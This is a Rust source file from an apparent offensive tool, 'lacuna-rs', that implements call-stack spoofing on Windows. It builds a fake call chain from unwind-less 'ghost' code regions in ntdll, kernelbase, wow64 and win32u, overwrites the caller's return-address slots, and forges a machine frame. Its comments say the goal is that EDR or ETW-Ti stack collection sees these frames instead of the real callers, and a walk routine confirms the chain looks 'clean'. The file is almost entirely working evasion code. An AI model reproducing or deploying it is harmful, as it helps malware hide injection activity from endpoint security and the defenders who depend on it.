//
// chain.rs — LACUNA chain construction + stack stomp for lacuna-rs
//
// Ported from lacuna_chain.c:
//   build_chain(), stomp_plant(), stomp_restore(), lacuna_walk_chain(),
//   teb_stack_base(), teb_stack_limit().
//
// The "chain" is a fake but structurally valid call stack built from ghost
// regions (executable code with no .pdata coverage).  When ETW-Ti fires an
// APC during NtDelayExecution(alertable), the kernel unwinds through these
// ghost frames instead of the real callers.
//

#![cfg(feature = "stack-spoof")]
#![allow(dead_code)]

use crate::pe;
use crate::scan::{self, Ghost, GhostGadget};
use crate::stub;
use crate::win::{
    ULONG64, PVOID,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    VirtualAlloc,
    CONTEXT, CONTEXT_FULL,
    PRtlLookupFunctionEntry, PRtlVirtualUnwind,
    UNWIND_HISTORY_TABLE, DWORD64,
    get_module, get_proc,
};
use core::sync::atomic::{AtomicU64, Ordering};

// ── Machine frame (BYOUD-MF) ─────────────────────────────────────────────────

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
pub struct MachFrame {
    pub Rip: ULONG64,
    pub Cs: ULONG64,
    pub EFlags: ULONG64,
    pub Rsp: ULONG64,
    pub Ss: ULONG64,
}

// ── Fake stack layout ────────────────────────────────────────────────────────
//
//   L5_thread_root   ← walked last
//   L4_win32u
//   L3_ntdll
//   L2_kbase
//   L1_wow64         ← g_chain_rsp points here
//   MachFrame (40 B) ← consumed by UWOP_PUSH_MACHFRAME handler
//   mf_trigger       ← KiUserExceptionDispatcher+4
//
#[repr(C)]
pub struct LacunaStack {
    pub L5_thread_root: ULONG64,
    pub L4_win32u: ULONG64,
    pub L3_ntdll: ULONG64,
    pub L2_kbase: ULONG64,
    pub L1_wow64: ULONG64,
    pub mf: MachFrame,
    pub mf_trigger: ULONG64,
}

// ── Global state (file-scope statics in C) ───────────────────────────────────

pub static G_LS: AtomicU64 = AtomicU64::new(0);        // *mut LacunaStack
pub static G_CHAIN_RSP: AtomicU64 = AtomicU64::new(0);
pub static G_SAVE_RSP: AtomicU64 = AtomicU64::new(0);
pub static G_MF_WALK: AtomicU64 = AtomicU64::new(0);   // *mut [ULONG64; 4]

// ── Ghost-layer accessor (used by veh.rs) ────────────────────────────────────

/// Return the four ghost-layer addresses [L1, L2, L3, L4] for the VEH's
/// full-spoof pass.
pub fn ghost_layers() -> [ULONG64; 4] {
    let ls = G_LS.load(Ordering::Relaxed) as *const LacunaStack;
    if ls.is_null() {
        return [0; 4];
    }
    unsafe {
        [
            (*ls).L1_wow64,
            (*ls).L2_kbase,
            (*ls).L3_ntdll,
            (*ls).L4_win32u,
        ]
    }
}

// ── TEB stack-base/limit (BYOUD-RT) ──────────────────────────────────────────

/// Read TEB.StackBase (GS:[0x08]).
///
/// Ported from teb_stack_base().
#[cfg(target_arch = "x86_64")]
pub fn teb_stack_base() -> ULONG64 {
    let base: ULONG64;
    unsafe {
        core::arch::asm!(
            "mov {0}, gs:[0x08]",
            out(reg) base,
            options(nostack, nomem, preserves_flags),
        );
    }
    base
}

/// Read TEB.StackLimit (GS:[0x10]).
///
/// Ported from teb_stack_limit().
#[cfg(target_arch = "x86_64")]
pub fn teb_stack_limit() -> ULONG64 {
    let limit: ULONG64;
    unsafe {
        core::arch::asm!(
            "mov {0}, gs:[0x10]",
            out(reg) limit,
            options(nostack, nomem, preserves_flags),
        );
    }
    limit
}

// ── build_chain ──────────────────────────────────────────────────────────────

/// Build the LACUNA ghost-frame chain.
///
/// Ported from build_chain().  Returns true on success.
pub fn build_chain() -> bool {
    let ntdll = get_module(b"ntdll.dll\0");
    let kbase = get_module(b"kernelbase.dll\0");
    let wow64 = get_module(b"wow64.dll\0");
    let win32u = get_module(b"win32u.dll\0");

    let nt_t: &[&[u8]] = &[
        b"RtlCreateUserThread\0",
        b"NtAllocateVirtualMemory\0",
        b"LdrLoadDll\0",
        b"NtCreateThreadEx\0",
        b"RtlUserThreadStart\0",
    ];
    let kb_t: &[&[u8]] = &[
        b"VirtualProtect\0",
        b"VirtualAllocEx\0",
        b"WriteProcessMemory\0",
        b"CreateRemoteThreadEx\0",
    ];
    let w64_t: &[&[u8]] = &[
        b"Wow64PrepareForException\0",
        b"Wow64KiUserCallbackDispatcher\0",
        b"Wow64ApcRoutine\0",
    ];

    let mut ng = [Ghost {
        va_start: 0, va_end: 0, size: 0, export_va: 0, dist: 0, name: [0; 64],
    }; 512];
    let mut kg = [Ghost {
        va_start: 0, va_end: 0, size: 0, export_va: 0, dist: 0, name: [0; 64],
    }; 512];
    let mut wg = [Ghost {
        va_start: 0, va_end: 0, size: 0, export_va: 0, dist: 0, name: [0; 64],
    }; 64];

    let n_ng = scan::scan_ghosts(ntdll, nt_t, &mut ng);
    let n_kg = scan::scan_ghosts(kbase, kb_t, &mut kg);
    let n_wg = if !wow64.is_null() {
        scan::scan_ghosts(wow64, w64_t, &mut wg)
    } else {
        0
    };

    // Ghost gadget (JMP [RBX]) — prefer ntdll, then kernelbase.
    let mut g_ghost_gadget: ULONG64 = 0;
    let mut g_ghost_mod: u8 = 0;
    let mut gg = [GhostGadget { va: 0, parent: [0; 64] }; 8];
    let ngg = scan::scan_ghost_gadgets(&ng[..n_ng], b"ntdll\0", &mut gg);
    if ngg > 0 {
        g_ghost_gadget = gg[0].va;
        g_ghost_mod = 1;
    } else {
        let ngg2 = scan::scan_ghost_gadgets(&kg[..n_kg], b"kernelbase\0", &mut gg);
        if ngg2 > 0 {
            g_ghost_gadget = gg[0].va;
            g_ghost_mod = 2;
        }
    }
    if g_ghost_gadget != 0 {
        stub::G_GHOST_GADGET.store(g_ghost_gadget, Ordering::Relaxed);
        stub::G_GHOST_MOD.store(g_ghost_mod, Ordering::Relaxed);
    }

    // L1 — wow64 ghost (fallback: nearest ntdll ghost).
    let mut g1 = scan::best_ghost(&wg[..n_wg], b"Wow64PrepareForException");
    if g1.is_none() {
        g1 = scan::best_ghost(&wg[..n_wg], b"Wow64KiUserCallbackDispatcher");
    }
    let l1 = if let Some(g) = g1 {
        g.va_start + g.size as ULONG64 / 2
    } else {
        let g3pre = scan::best_ghost(&ng[..n_ng], b"RtlCreateUserThread")
            .or_else(|| scan::best_ghost(&ng[..n_ng], b"NtAllocateVirtualMemory"));
        let mut bf: Option<&Ghost> = None;
        let mut bd = 0xFFFF_FFFFu32;
        for k in 0..n_ng {
            if let Some(pre) = g3pre {
                if core::ptr::eq(&ng[k], pre) {
                    continue;
                }
            }
            if ng[k].dist < bd {
                bd = ng[k].dist;
                bf = Some(&ng[k]);
            }
        }
        let bf = bf.or(g3pre);
        bf.map(|g| g.va_start + g.size as ULONG64 / 2)
            .unwrap_or(ntdll as ULONG64 + 0x50F80)
    };

    // L2 — kernelbase ghost.
    let g2 = scan::best_ghost(&kg[..n_kg], b"VirtualProtect")
        .or_else(|| scan::best_ghost(&kg[..n_kg], b"VirtualAllocEx"));
    let l2 = if g_ghost_mod == 2 {
        g_ghost_gadget
    } else {
        g2.map(|g| g.va_start + g.size as ULONG64 / 2)
            .unwrap_or(kbase as ULONG64 + 0x64180)
    };

    // L3 — ntdll ghost.
    let g3 = scan::best_ghost(&ng[..n_ng], b"RtlCreateUserThread")
        .or_else(|| scan::best_ghost(&ng[..n_ng], b"NtAllocateVirtualMemory"));
    let l3 = if g_ghost_mod == 1 {
        g_ghost_gadget
    } else {
        g3.map(|g| g.va_start + g.size as ULONG64 / 2)
            .unwrap_or(ntdll as ULONG64 + 0x50F80)
    };

    // L4 — win32u nop gap.
    let l4 = if !win32u.is_null() {
        scan::win32u_nop_gap(win32u)
    } else {
        ng[0].va_start + 4
    };

    // L5 — RtlUserThreadStart+0x21.
    let l5 = pe::export_va(ntdll, b"RtlUserThreadStart\0") + 0x21;

    // L0 — BYOUD-MF anchor.
    let l0 = scan::find_mf_target(ntdll);

    // Allocate the LacunaStack + MF-walk buffer.
    let total = core::mem::size_of::<LacunaStack>() + 0x100;
    let m = unsafe {
        VirtualAlloc(
            core::ptr::null_mut(),
            total,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if m.is_null() {
        return false;
    }
    let ls = m as *mut LacunaStack;
    let mf_walk = unsafe { (ls as *mut u8).add(core::mem::size_of::<LacunaStack>()) } as *mut ULONG64;

    unsafe {
        // MF walk buffer: L2→L3→L4→L5 in ascending-address order.
        *mf_walk.add(0) = l2;
        *mf_walk.add(1) = l3;
        *mf_walk.add(2) = l4;
        *mf_walk.add(3) = l5;

        (*ls).L5_thread_root = l5;
        (*ls).L4_win32u = l4;
        (*ls).L3_ntdll = l3;
        (*ls).L2_kbase = l2;
        (*ls).L1_wow64 = l1;
        (*ls).mf.Rip = l1;
        (*ls).mf.Cs = 0x0033;
        (*ls).mf.EFlags = 0x0000_0202;
        (*ls).mf.Rsp = mf_walk as ULONG64;
        (*ls).mf.Ss = 0x002B;
        (*ls).mf_trigger = l0;
    }

    G_LS.store(ls as ULONG64, Ordering::Relaxed);
    G_CHAIN_RSP.store(unsafe { &(*ls).mf as *const _ as ULONG64 }, Ordering::Relaxed);
    G_MF_WALK.store(mf_walk as ULONG64, Ordering::Relaxed);
    true
}

// ── stomp_plant / stomp_restore ──────────────────────────────────────────────

pub const STOMP_DEPTH: usize = 4;

/// Write L1–L4 into the return-address slot of the caller and the three
/// dead shadow words above it.
///
/// Ported from stomp_plant().  This must be `#[inline(never)]` so the

/// # Warning: Frame-Pointer Requirement
///
/// This function uses `mov rbp, {x}` inline asm to locate the caller's
/// frame. It **requires** the consuming crate to be compiled with
/// `-C force-frame-pointers=yes`. Without it, RBP will not point to a
/// valid frame and this function will silently no-op or corrupt the stack.
///
/// Add to your `.cargo/config.toml`:
/// ``toml
/// [build]
/// rustflags = [`-C`, `force-frame-pointers=yes`]
/// ``
/// frame-pointer walk lands on the intended caller.
#[inline(never)]
pub fn stomp_plant() {
    let ls = G_LS.load(Ordering::Relaxed) as *const LacunaStack;
    if ls.is_null() {
        return;
    }
    let layers: [ULONG64; STOMP_DEPTH] = unsafe {
        [
            (*ls).L1_wow64,
            (*ls).L2_kbase,
            (*ls).L3_ntdll,
            (*ls).L4_win32u,
        ]
    };

    let stack_base = teb_stack_base();
    let stack_limit = teb_stack_limit();

    // `__builtin_frame_address(1)` — get the caller's frame.
    let frame: *mut ULONG64 = unsafe {
        let mut fp: *mut ULONG64;
        core::arch::asm!(
            "mov {0}, [rbp]",
            out(reg) fp,
            options(nostack, preserves_flags),
        );
        fp
    };

    if frame.is_null()
        || (frame as ULONG64) < stack_limit
        || (frame as ULONG64) >= stack_base
    {
        return;
    }

    unsafe {
        for d in 0..STOMP_DEPTH {
            let slot = frame.add(1 + d);
            crate::veh::G_STOMP_PTRS[d].store(slot as ULONG64, Ordering::Relaxed);
            crate::veh::G_STOMP_SLOTS[d].store(*slot, Ordering::Relaxed);
            *slot = layers[d];
        }
        crate::veh::G_STOMP_SAVED.store(*frame.add(1), Ordering::Relaxed);
    }
}

/// Restore the stomped stack slots.
///
/// Ported from stomp_restore().
pub fn stomp_restore() {
    for d in 0..STOMP_DEPTH {
        let ptr = crate::veh::G_STOMP_PTRS[d].load(Ordering::Relaxed);
        if ptr != 0 {
            let val = crate::veh::G_STOMP_SLOTS[d].load(Ordering::Relaxed);
            unsafe {
                *(ptr as *mut ULONG64) = val;
            }
        }
    }
}

// ── lacuna_walk_chain (verify) ───────────────────────────────────────────────

/// Walk the chain the same way an EDR stack collector would, using
/// RtlLookupFunctionEntry + RtlVirtualUnwind.
///
/// Ported from lacuna_walk_chain().  Prints the full stack-frame trace
/// (each frame's RIP, whether it has a RUNTIME_FUNCTION, and its layer
/// label), then runs a second BYOUD-MF pass from mf_trigger.
///
/// Returns true if all 5 layers were seen in the primary walk.
#[allow(unused_unsafe)]
pub fn walk_chain() -> bool {
    let ntdll = get_module(b"ntdll.dll\0");
    let lookup_fe_ptr = get_proc(ntdll, b"RtlLookupFunctionEntry\0");
    let vu_ptr = get_proc(ntdll, b"RtlVirtualUnwind\0");
    if lookup_fe_ptr.is_none() || vu_ptr.is_none() {
        eprintln!("{}", lc!("[-] can't resolve unwind apis"));
        return false;
    }
    let lookup_fe: PRtlLookupFunctionEntry =
        unsafe { core::mem::transmute(lookup_fe_ptr.unwrap()) };
    let vu: PRtlVirtualUnwind =
        unsafe { core::mem::transmute(vu_ptr.unwrap()) };

    let ls = G_LS.load(Ordering::Relaxed) as *const LacunaStack;
    if ls.is_null() {
        return false;
    }

    let l1 = unsafe { (*ls).L1_wow64 };
    let l2 = unsafe { (*ls).L2_kbase };
    let l3 = unsafe { (*ls).L3_ntdll };
    let l4 = unsafe { (*ls).L4_win32u };
    let l5 = unsafe { (*ls).L5_thread_root };

    // ── Primary walk: L1 → L2 → L3 → L4 → L5 ──────────────────────────
    //
    // Chain buffer: L2→L3→L4→L5 in ascending-address order so the
    // leaf RSP+=8 walk reads the correct next return address.

    let chain: [ULONG64; 4] = [l2, l3, l4, l5];

    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL;
    unsafe {
        ctx.Rip = l1;
        ctx.Rsp = &chain as *const _ as ULONG64;
    }

    let lnames: [&str; 5] = [
        "L1  wow64    ghost  (Wow64PrepareForException)",
        "L2  kbase    ghost  (VirtualProtect)",
        "L3  ntdll    ghost  (RtlCreateUserThread)",
        "L4  win32u   nop gap",
        "L5  RtlUserThreadStart+0x21",
    ];

    println!("[*] walking chain (same path as EDR stack collector)\n");

    let mut seen = [false; 5];
    let mut hits = 0;

    for i in 0..20 {
        if ctx.Rip == 0 {
            break;
        }
        let mut imgbase: DWORD64 = 0;
        let mut hist: UNWIND_HISTORY_TABLE = unsafe { core::mem::zeroed() };
        let rf = unsafe { lookup_fe(ctx.Rip, &mut imgbase, &mut hist) };

        let (lbl, li): (&str, Option<usize>) = if ctx.Rip == l1 {
            (lnames[0], Some(0))
        } else if ctx.Rip == l2 {
            (lnames[1], Some(1))
        } else if ctx.Rip == l3 {
            (lnames[2], Some(2))
        } else if ctx.Rip == l4 {
            (lnames[3], Some(3))
        } else if ctx.Rip == l5 {
            (lnames[4], Some(4))
        } else {
            ("", None)
        };
        if let Some(idx) = li {
            if !seen[idx] {
                seen[idx] = true;
                hits += 1;
            }
        }

        println!(
            "  [{:2}]  {:016x}  {:<8}  {}",
            i,
            ctx.Rip,
            if rf.is_null() { "ghost" } else { "rf" },
            lbl
        );

        if hits == 5 {
            println!("  (thread root — stopping)");
            break;
        }

        if rf.is_null() {
            // Leaf frame: no RUNTIME_FUNCTION — unwinder does RSP += 8.
            unsafe {
                ctx.Rip = *(ctx.Rsp as *const ULONG64);
                ctx.Rsp += 8;
            }
        } else {
            // Has RUNTIME_FUNCTION — use RtlVirtualUnwind.
            let mut hd: PVOID = core::ptr::null_mut();
            let mut ef: DWORD64 = 0;
            unsafe {
                vu(
                    0,
                    imgbase,
                    ctx.Rip,
                    rf,
                    &mut ctx,
                    &mut hd,
                    &mut ef,
                    core::ptr::null_mut(),
                );
            }
        }
    }

    println!();
    for i in 0..5 {
        println!("  {}  {}", if seen[i] { "[+]" } else { "[ ]" }, lnames[i]);
    }

    let ok = seen.iter().all(|&s| s);
    println!(
        "\n{} all layers {}",
        if ok { "[+]" } else { "[!]" },
        if ok {
            "ghost — chain is clean"
        } else {
            "PARTIAL — check addresses above"
        }
    );

    // ── BYOUD-MF pass: walk from mf_trigger through the machine frame ─
    //
    // The unwinder hits KiUserExceptionDispatcher's UWOP_PUSH_MACHFRAME,
    // reads Rip=L1 and Rsp=&g_mf_walk[0], then continues L1→L2→L3→L4→L5.

    let mf_trigger = unsafe { (*ls).mf_trigger };
    println!(
        "\n[*] BYOUD-MF pass: starting from mf_trigger (L0={:016x})\n",
        mf_trigger
    );

    let mut mf_ctx: CONTEXT = unsafe { core::mem::zeroed() };
    mf_ctx.ContextFlags = CONTEXT_FULL;
    unsafe {
        mf_ctx.Rip = mf_trigger;
        mf_ctx.Rsp = &(*ls).mf as *const _ as ULONG64;
    }

    let mf_names: [&str; 6] = [
        "L0  MF anchor (KiUserExceptionDispatcher)",
        "L1  wow64 ghost",
        "L2  kbase ghost",
        "L3  ntdll ghost",
        "L4  win32u nop gap",
        "L5  RtlUserThreadStart+0x21",
    ];

    let mut mf_seen = [false; 6];
    let mut mf_hits = 0;

    for i in 0..20 {
        if mf_ctx.Rip == 0 {
            break;
        }
        let mut imgbase: DWORD64 = 0;
        let mut hist: UNWIND_HISTORY_TABLE = unsafe { core::mem::zeroed() };
        let rf = unsafe { lookup_fe(mf_ctx.Rip, &mut imgbase, &mut hist) };

        let li: Option<usize> = if mf_ctx.Rip == mf_trigger {
            Some(0)
        } else if mf_ctx.Rip == l1 {
            Some(1)
        } else if mf_ctx.Rip == l2 {
            Some(2)
        } else if mf_ctx.Rip == l3 {
            Some(3)
        } else if mf_ctx.Rip == l4 {
            Some(4)
        } else if mf_ctx.Rip == l5 {
            Some(5)
        } else {
            None
        };
        if let Some(idx) = li {
            if !mf_seen[idx] {
                mf_seen[idx] = true;
                mf_hits += 1;
            }
        }

        let lbl = if let Some(idx) = li { mf_names[idx] } else { "" };
        println!(
            "  [{:2}]  {:016x}  {:<8}  {}",
            i,
            mf_ctx.Rip,
            if rf.is_null() { "ghost" } else { "rf/MF" },
            lbl
        );

        if mf_hits == 6 {
            println!("  (thread root — stopping)");
            break;
        }

        if rf.is_null() {
            unsafe {
                mf_ctx.Rip = *(mf_ctx.Rsp as *const ULONG64);
                mf_ctx.Rsp += 8;
            }
        } else {
            let mut hd: PVOID = core::ptr::null_mut();
            let mut ef: DWORD64 = 0;
            unsafe {
                vu(
                    0,
                    imgbase,
                    mf_ctx.Rip,
                    rf,
                    &mut mf_ctx,
                    &mut hd,
                    &mut ef,
                    core::ptr::null_mut(),
                );
            }
        }
    }

    println!();
    for i in 0..6 {
        println!("  {}  {}", if mf_seen[i] { "[+]" } else { "[ ]" }, mf_names[i]);
    }

    let mf_ok = mf_seen[0] && mf_seen[1] && mf_seen[2];
    println!(
        "\n{} BYOUD-MF teleport {}",
        if mf_ok { "[+]" } else { "[!]" },
        if mf_ok {
            "worked — RSP jumped through machine frame"
        } else {
            "partial — MF may need version-specific offsets"
        }
    );

    ok
}
